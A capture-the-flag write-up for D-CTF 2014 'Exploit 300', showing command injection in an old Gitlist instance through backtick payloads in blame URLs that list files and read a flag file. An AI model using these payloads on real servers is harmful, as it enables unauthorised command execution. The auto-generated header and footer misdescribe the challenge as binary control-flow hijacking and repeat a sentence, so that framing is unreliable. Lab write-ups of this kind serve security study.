---
SOURCE: github_writeups
URL: https://raw.githubusercontent.com/ctfs/writeups/master/d-ctf-2014/exploit-300/README.md
CHALLENGE: README
EVENT: GitHub - ctfs/writeups
TEAM: N/A
CATEGORY: other
DIFFICULTY: Unknown
PROTECTIONS: None
KEY_FUNCTIONS: read
KEY_TECHNIQUE: The writeup describes a other vulnerability leveraging read to hijack the control flow.
---
# D-CTF 2014: Exploit 300 – People say…

**Category:** Exploit
**Points:** 300
**Description:**

> People say that if you're still angry at 80, you're not an angry young man, just a grumpy old git. 10.13.37.33
>
> **Hint:** gitlist.

## Write-up

Taking the hint, we navigate to `http://10.13.37.33/gitlist/` which hosts a [Gitlist](http://gitlist.org/) instance. Older versions of Gitlist are [vulnerable to remote command execution](http://hatriot.github.io/blog/2014/06/29/gitlist-rce/). Let’s try executing `ls -al` on the target server:

```
http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60ls%20-al%60
```

It works! After some recon work, we find a file named `e3.flag` in the server root. Let’s view its contents using the following payload:

```
http://10.13.37.33/gitlist/redis/blame/unstable/README%22%22%60cat%20%2Fe3.flag%60
```

The result is:

```
stupid psychopathic git.
```

This is the flag.

## Other write-ups and resources

* none yet

[Additional Context: This documentation page explains the details of README in the scope of binary exploitation and CTF pwn challenges. It covers core concepts related to other and includes references for learning other techniques.] This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals. This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals.